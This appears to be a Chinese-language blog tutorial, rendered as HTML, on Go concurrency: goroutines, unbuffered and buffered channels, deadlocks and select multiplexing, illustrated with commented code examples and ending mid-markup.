title="goroutine的基本概念"></a>goroutine的基本概念</h2><ul><li><strong>概念</strong>：是一种<strong>轻量级的线程</strong>，用于执行程序并发任务，与传统线程相比，goroutines更加轻量且消耗更少，</li></ul><p><em>routine:常规；例行程序；日常工作</em></p><p>与创建线程相比，创建成本和开销都很小，每个goroutine的堆栈只有几kb，并且堆栈可根据程序的需要增长和缩小（线程的堆栈是需要指明和固定的），所以go语言从语言层面就支持高并发。</p><ul><li>并发执行：多个goroutines可以同时运行，且不需要显式的线程管理，有助于充分利用多核处理器，提高程序的性能</li><li>轻量级：goroutines比传统线程更轻量。这个轻量可以通俗理解为创建和销毁他们的成本很低，通常数百上千的goroutines可以在同一个程序中运行而不会引发性能问题</li><li>并发通信：goruntines之间的可以通过通道（channel）进行安全的并发通信，通道是goroutines之间交换数据的一种机制，避免了竞争条件和协调任务</li><li>并发模型：Go 语言的并发模型是基于 CSP（Communicating Sequential Processes）的，它强调通过通信来共享数据，而不是共享数据来通信。这种模型使并发编程更加安全和可维护。</li><li>如何<strong>启动 goroutine</strong>：要启动一个goroutine，只需要在函数或方法调用前加上关键字’go’ 即可创建一个新的goroutine来执行该函数，程序继续执行后续任务，而不会等待goroutine完成</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// 启动一个 Goroutine 执行 hello 函数</span><br>    <span class="hljs-keyword">go</span> hello()<br><br>    <span class="hljs-comment">// 主线程继续执行其他任务</span><br>    fmt.Println(<span class="hljs-string">&quot;Main function&quot;</span>)<br><br>    <span class="hljs-comment">// 等待一段时间以确保 Goroutine 有足够的时间执行</span><br>    time.Sleep(time.Second)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Println(<span class="hljs-string">&quot;Hello, Goroutine!&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>程序执行的背后：当程序启动的时候，只有一个goroutine来调用main函数，可以理解为主goroutine，新的goroutine通过go语句进行创建</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">DelayPrint</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">4</span>; i++ &#123;<br>time.Sleep(<span class="hljs-number">250</span> * time.Millisecond)<br>fmt.Println(i)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">HelloWorld</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Hello world goroutine&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">go</span> DelayPrint()    <span class="hljs-comment">// 开启第一个goroutine</span><br><span class="hljs-keyword">go</span> HelloWorld()    <span class="hljs-comment">// 开启第二个goroutine</span><br>time.Sleep(<span class="hljs-number">2</span>*time.Second)<br>fmt.Println(<span class="hljs-string">&quot;main function&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><em>tips：DelayPrint里面的sleep ，会导致第二个goroutine阻塞或者等待吗？</em><ul><li>答案肯定是不会</li></ul></li><li>当程序执行go func()的时候，只是简单的调用然后就立即返回了，并不关心函数内部发生的事情，所以不同的goroutine直接不影响，main会继续按顺序执行语句，所以两个go rountine同时在跑，但是肯定是第一个gorounine先执行</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sayHello</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++ &#123;<br>fmt.Println(<span class="hljs-string">&quot;hello&quot;</span>)<br>fmt.Printf(<span class="hljs-string">&quot;这是sayHello函数内打印的第%v次\n&quot;</span>, i)<br>time.Sleep(time.Millisecond * <span class="hljs-number">100</span>) <span class="hljs-comment">// 暂停等待100毫秒</span><br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sayWorld</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++ &#123;<br>fmt.Println(<span class="hljs-string">&quot;world&quot;</span>)<br>fmt.Printf(<span class="hljs-string">&quot;这是sayWorld函数内打印的第%v次\n&quot;</span>, i)<br>time.Sleep(time.Millisecond * <span class="hljs-number">100</span>) <span class="hljs-comment">// 暂停等待100毫秒</span><br><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// sayHello()</span><br><span class="hljs-keyword">go</span> sayHello() <span class="hljs-comment">//在函数前面加一个go关键字就将这个函数单独的放在一个Goroutine中执行，与主Goroutine并行执行</span><br><span class="hljs-keyword">go</span> sayWorld()<br>fmt.Println(<span class="hljs-string">&quot;这句话先走还是后走&quot;</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++ &#123;<br>fmt.Println(<span class="hljs-string">&quot;yes&quot;</span>)<br>fmt.Printf(<span class="hljs-string">&quot;这是main函数内打印的第%v次\n&quot;</span>, i)<br>time.Sleep(time.Millisecond * <span class="hljs-number">100</span>) <span class="hljs-comment">// 暂停等待100毫秒</span><br>&#125;<br><br><span class="hljs-comment">// time.Sleep(time.Second)</span><br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出内容如下：</span><br><span class="hljs-comment">这句话先走还是后走</span><br><span class="hljs-comment">yes</span><br><span class="hljs-comment">这是main函数内打印的第0次</span><br><span class="hljs-comment">world</span><br><span class="hljs-comment">这是sayWorld函数内打印的第0次</span><br><span class="hljs-comment">hello</span><br><span class="hljs-comment">这是sayHello函数内打印的第0次</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>这里从输出内容看得出来，当程序碰到go func()的时候，并不管go func()的内容，直接就去执行后面的代码了</li></ul><h2 id="通道（channel）"><a href="#通道（channel）" class="headerlink" title="通道（channel）"></a>通道（channel）</h2><p>概念：</p><ul><li>通道是什么：是一种数据结构，所以通道可以用var 来声明数据的类型的</li><li>干什么？：通道是一种在goroutines之间传递的数据结构，它类似于一个<strong>队列</strong>，同于在通道与通道之间<strong>发送和接收数据的</strong></li><li>通道的类型：道中传递的数据必须与通道的类型匹配。通道类型使用 <code>chan</code> 关键字，如 <code>chan int</code> 表示一个整数类型的通道。</li><li>发送和接收：通道的基本操作有发送（<code>send</code>）和接收（<code>receive</code>）。通过通道发送数据时，数据会被发送到通道，然后可以在另一个 Goroutine 中接收。</li><li>阻塞：当发送或接收操作发生时，它们可能会<strong>阻塞</strong>当前 Goroutine，直到有另一个 Goroutine 准备好接收或发送数据。这有助于同步不同 Goroutines 之间的操作。<ul><li><strong>从channel中读取数据，如果channel之前没有写入数据，也会导致阻塞，直到channel中被写入数据为止</strong></li></ul></li></ul><p>强调一下：</p><ul><li>通道是在传递数据，而不是在赋值数据，当通道A 体内的数据，传给了B的时候，A就没有数据了，就空了，B就接收到了B就有了</li></ul><p>接收操作（<code>&lt;-channel</code>）、发送操作（<code>channel &lt;- data</code>）或关闭操作（<code>close(channel)</code>）。</p><p>声明：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> ch <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>      <span class="hljs-comment">// 声明一个传递int类型的channel</span><br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>) <span class="hljs-comment">// 使用内置函数make()定义一个channel</span><br><br>ch &lt;- value          <span class="hljs-comment">// 将一个数据value写入至channel，这会导致阻塞，直到有其他goroutine从这个channel中读取数据</span><br>value := &lt;-ch        <span class="hljs-comment">// 从channel中读取数据，如果channel之前没有写入数据，也会导致阻塞，直到channel中被写入数据为止</span><br><span class="hljs-comment">//=========</span><br><span class="hljs-built_in">close</span>(ch)            <span class="hljs-comment">// 关闭channel</span><br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br>fmt.Println(<span class="hljs-built_in">len</span>(c))  <span class="hljs-comment">// 通道内实际使用长度，</span><br>fmt.Println(<span class="hljs-built_in">cap</span>(c))  <span class="hljs-comment">// 通道的容积长度，</span><br><br></code></pre></td></tr></table></figure><p>类型：通道理论上来说可以分2种</p><ul><li><p>无缓冲通道和缓冲通道</p></li><li><p>无缓冲通道：无缓冲通道上的<strong>发送</strong>操作将会被阻塞，<strong>直到</strong>另一个goroutine在对应的通道上执行<strong>接收</strong>操作，此时值才传送完成，两个Goroutine都继续执行（发送时阻塞，直到接收才会畅通继续） </p><ul><li>定义的时候，不给大小就是一个无缓冲通道了，ch:&#x3D;make(chan int) int<strong>后面不设容量</strong></li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> done <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span> <span class="hljs-comment">//：这里声明了一个名为 done 的布尔类型通道 用来进行通道之间数据通讯</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">HelloWorld</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot; hello world channel&quot;</span>) <span class="hljs-comment">//打印，这里注意下，下面有用</span><br>time.Sleep(time.Millisecond * <span class="hljs-number">500</span>)  <span class="hljs-comment">// 等待500ms</span><br>done &lt;- <span class="hljs-literal">true</span>                        <span class="hljs-comment">// 这里是向done这个channel 发送数据，发送的内容是 true 因为他是一个bool类型的channel 注意，发送数据的时候将会阻塞</span><br>&#125;<br><br><span class="hljs-comment">// func main() &#123;</span><br><span class="hljs-comment">// done = make(chan bool) //  创建一个bool类型的channel 名字叫done 这个通道将用于等待helloWorld函数的完成 分配内存了</span><br><span class="hljs-comment">// go HelloWorld() //启动一个新的goroutine 用来执行helloWorld函数</span><br><span class="hljs-comment">// &lt;-done  // 接收操作，它从 done 通道接收数据</span><br><span class="hljs-comment">// 这个操作会阻塞，直到 HelloWorld 函数发送数据到 done 通道。一旦数据到达，程序将继续执行，然后退出</span><br><span class="hljs-comment">// 如果没有发送和接收通道的操作，那么主goroutine函数main将不会等待goroutine函数helloWorld直接完成就会直接退出mian结束</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)   <span class="hljs-comment">// make就是创建了一个channel类型没有容量（无缓冲）类型的变量名称为ch  后面没设置缓冲通道的大小，就是无缓冲 分配内存了 </span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ch <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> &#123; <span class="hljs-comment">// func匿名函数，go是表示他是goroutine 入参是无缓冲channel类型，</span><br>fmt.Println(&lt;-ch) <span class="hljs-comment">// 使用&lt;-channel来接收channel类型 作用是冲通道ch接收数据，并且答应出来，接收到的是多少就打印多少</span><br>&#125;(ch)<br>ch &lt;- <span class="hljs-number">10</span> <span class="hljs-comment">//主函数main将整数10发送到ch通道中，使用&lt;- 用来发送和接收 &lt;-左边是channel就代表想ch发送，&lt;-右边是ch就代表在接收channel</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">总体来说，这段代码的主要目的是创建一个通道 ch，然后启动一个协程，</span><br><span class="hljs-comment">该协程从通道 ch 中接收数据并将其打印到标准输出。</span><br><span class="hljs-comment">同时，主函数将整数值 10 发送到通道 ch 中。由于通道是无缓冲的，</span><br><span class="hljs-comment">这个发送操作会导致协程解除阻塞，接收并打印值 10。因此，你会在标准输出中看到 &quot;10&quot;。这个示例展示了 Go 语言中的并发和通道的基本使用。</span><br><span class="hljs-comment">*/</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>通道可以用来连接goroutine，这样一个的输出是另一个输入。这就叫做管道。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> echo <span class="hljs-keyword">chan</span> <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> receive <span class="hljs-keyword">chan</span> <span class="hljs-type">string</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Echo</span><span class="hljs-params">()</span></span> &#123;<br>time.Sleep(time.Microsecond * <span class="hljs-number">500</span>)<br>echo &lt;- <span class="hljs-string">&quot;咖啡色的羊驼&quot;</span> <span class="hljs-comment">// 这里在向echo这个通道发送数据</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Receive</span><span class="hljs-params">()</span></span> &#123;<br>temp := &lt;-echo <span class="hljs-comment">// 接收echo通道传过来的数据 这里会阻塞，等待数据传输结束后，</span><br>receive &lt;- temp <span class="hljs-comment">// 将temp接收过来的通道数据，传给receive，</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>echo = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)<br>receive = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)<br><br><span class="hljs-keyword">go</span> Echo()<br><span class="hljs-keyword">go</span> Receive()<br>getStrt := &lt;-receive  <span class="hljs-comment">// 接收 receive 通道传过来的数据 </span><br>fmt.Println(getStrt) <br>&#125;<br><span class="hljs-comment">// 在这里不一定要去关闭channel，因为底层的垃圾回收机制会根据它是否可以访问来决定是否自动回收它。(这里不是根据channel是否关闭来决定的)</span><br></code></pre></td></tr></table></figure><ul><li>单向通道：<ul><li>单向就是指限制一头通信，比如限制仅接收，或者限制仅发送数据</li><li>双向通道可以修改为单向通道，反之不行</li><li>当程序则够复杂的时候，为了代码可读性更高，拆分成一个一个的小函数是需要的。</li></ul></li></ul><p>goroutine的通道默认是阻塞的，那么有什么办法可以去缓解阻塞呢：？</p><p><em>答案：加一个缓冲区</em></p><ul><li>缓冲通道： 一个有容量的通道，可以定义他的容积大小。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">3</span>) <span class="hljs-comment">// 创建了缓冲区为3的通道</span><br><br><span class="hljs-comment">//=========</span><br><span class="hljs-built_in">len</span>(ch)   <span class="hljs-comment">// 长度计算</span><br><span class="hljs-built_in">cap</span>(ch)   <span class="hljs-comment">// 容量计算</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/channel.png" alt="channel"></p><ul><li><strong>当他体内的容积被塞满后，就会阻塞</strong> ，就会死锁</li><li>必须要让通道体内元素个数不大于其设定的容积大小，不然就会报错</li></ul><p>通道有点类似于python的锁一样，谁拿到这个锁，谁就可以操作数据，通道就是谁进去了这个通道，谁就可以操作这个通道内的数据，当这个通道内塞满了的时候，就关门了，进不去了。</p><ul><li>对通道循环取值：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 对channel循环取值</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ch1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">100</span>) <span class="hljs-comment">// 给ch1这个变量分配了内存（实例化了） 是一个chan，里面的内容是int类型，100个空间</span><br>time.Sleep(time.Millisecond * <span class="hljs-number">100</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>ch1 &lt;- i <span class="hljs-comment">// 往这个ch1里面塞数据，把i塞进去了</span><br>&#125;<br><span class="hljs-built_in">close</span>(ch1) <span class="hljs-comment">// 注意要关闭通道</span><br><span class="hljs-comment">// 方式 1 </span><br><br><span class="hljs-comment">// for &#123;</span><br><span class="hljs-comment">// a, err := &lt;-ch1</span><br><span class="hljs-comment">// if !err &#123;</span><br><span class="hljs-comment">// return</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// fmt.Println(a)</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// 方式 2 </span><br><span class="hljs-keyword">for</span> a := <span class="hljs-keyword">range</span> ch1 &#123;<br>fmt.Println(a)<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="goroutine-阻塞死锁和友好退出"><a href="#goroutine-阻塞死锁和友好退出" class="headerlink" title="goroutine 阻塞死锁和友好退出"></a>goroutine 阻塞死锁和友好退出</h2><h3 id="锁："><a href="#锁：" class="headerlink" title="锁："></a>锁：</h3><p>锁用来控制并发访问共享资源的一种同步机制避免多个goroutine同事访问和修改相同的数据，从而导致数据竞争或者不一致的状态，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-comment">// 锁的概念与理解</span><br><span class="hljs-comment">// 先创建一个阻塞</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//func main() &#123;</span><br><span class="hljs-comment">//ch1 := make(chan int) // 创建了一个通道ch1 它是个无缓冲通道，容积是0，体内目前数据也是0</span><br><span class="hljs-comment">//&lt;-ch1 //把ch1体内的数据给出去，但是这个时候ch1体内是没数据的，就阻塞（deadlock死锁）了，这个时候阻塞的main函数goroutine ，通道被锁了</span><br><span class="hljs-comment">//// 提示：fatal error: all goroutines are asleep - deadlock!所有的goroutine都睡眠阻塞了，</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">// func main() &#123;</span><br><span class="hljs-comment">// ch1, ch2 := make(chan int), make(chan int) // 创建了两个通道，无缓冲的</span><br><span class="hljs-comment">// go func() &#123;</span><br><span class="hljs-comment">// ch1 &lt;- 1 // 往ch1里面塞了个1</span><br><span class="hljs-comment">// ch2 &lt;- 0 // ch2 里面也塞了个0</span><br><br><span class="hljs-comment">// &#125;() //后面加括号是表示返回值</span><br><br><span class="hljs-comment">// &lt;-ch2 // 把ch2的数据取走，</span><br><span class="hljs-comment">// // 这样运行会阻塞（deadlock死锁），因为往ch1里面塞了一个数据，</span><br><span class="hljs-comment">// // 但是ch1是个无缓冲的通道，现在他的体内被塞了一个数据，如果不把这个数据取走，就会阻塞，</span><br><span class="hljs-comment">// // 反之，ch2的数据被取走了，他体内的数据回到了定义的容积0个，所以它没有阻塞，</span><br><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// 接下来解锁思路 方式一，把体内数据给出去，让体内数据回到之前定义的大小</span><br><span class="hljs-comment">// func main() &#123;</span><br><span class="hljs-comment">// ch1, ch2 := make(chan int), make(chan int) // 创建了两个通道，无缓冲的</span><br><span class="hljs-comment">// go func() &#123;</span><br><span class="hljs-comment">// ch1 &lt;- 1 // 往ch1里面塞了个1</span><br><span class="hljs-comment">// ch2 &lt;- 0 // ch2 里面也塞了个0</span><br><br><span class="hljs-comment">// &#125;() //后面加括号是表示返回值</span><br><span class="hljs-comment">// &lt;-ch1 //  解锁思路，把ch1的数据也取走给出去，ch1就回到了体内数据为0的状态，这个时候就没阻塞了</span><br><span class="hljs-comment">// &lt;-ch2 // 把ch2的数据取走，</span><br><span class="hljs-comment">// // 这样运行会阻塞，因为往ch1里面塞了一个数据，</span><br><span class="hljs-comment">// // 但是ch1是个无缓冲的通道，现在他的体内被塞了一个数据，如果不把这个数据取走，就会阻塞，</span><br><span class="hljs-comment">// // 反之，ch2的数据被取走了，他体内的数据回到了定义的容积0个，所以它没有阻塞，</span><br><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// 接下来解锁思路 方式二，把体内容积扩容，</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ch1, ch2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>), <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>) <span class="hljs-comment">// 创建了两个通道，无缓冲的</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ch1 &lt;- <span class="hljs-number">1</span> <span class="hljs-comment">// 往ch1里面塞了个1 ,这个时候ch1体内数据1小于其容积2，所以不会阻塞</span><br>ch2 &lt;- <span class="hljs-number">0</span> <span class="hljs-comment">// ch2 里面也塞了个0，这个时候ch2体内数据1大于其容积1，如果不把体内数据给出去就会阻塞</span><br><br>&#125;() <span class="hljs-comment">//后面加括号是表示返回值</span><br><span class="hljs-comment">// &lt;-ch1 //  解锁思路，把ch1的数据也取走给出去，ch1就回到了体内数据为0的状态，这个时候就没阻塞了</span><br>&lt;-ch2 <span class="hljs-comment">// 把ch2的数据取走， 这个时候ch2的体内数据回到0，等于其容积，所以不会阻塞</span><br><span class="hljs-comment">// 这样运行会阻塞，因为往ch1里面塞了一个数据，</span><br><span class="hljs-comment">// 但是ch1是个无缓冲的通道，现在他的体内被塞了一个数据，如果不把这个数据取走，就会阻塞，</span><br><span class="hljs-comment">// 反之，ch2的数据被取走了，他体内的数据回到了定义的容积0个，所以它没有阻塞，</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="SELECT-CASE-多路复用"><a href="#SELECT-CASE-多路复用" class="headerlink" title="SELECT + CASE 多路复用"></a>SELECT + CASE 多路复用</h2><ul><li>select语句用于处理并发操作中的多个通道操作，它可以让你同事等待多个通道，并在其中任意一个通道就绪时执行对象的操作</li><li>与switch case语句类似，他有一系列的case分支和一个默认的分支，</li><li>每个分支case<strong>都会对应一个通道的通信</strong>（发送或者接收）过程，select会一直等待，直到某个case的通信操作完成时，就会执行case分支对应的语句，</li><li>如果多个case同时满足，select会<strong>随机</strong>选择一个去运行，</li><li>如果没有满足的case，<strong>则一直等待直到</strong>最后执行default分支，</li><li>如果没有任何通道就绪，<strong>且没有default子句，则sselect语句会阻塞</strong>，直到至少有一个通道就绪。</li><li>select应用场景一：多路复用，通讯，同时监听多个通道，一旦某个通道可以进行读写操作，对应的case语句就会被执行。这种方式可以有效实现多个并发任务之间的协调和同步</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span 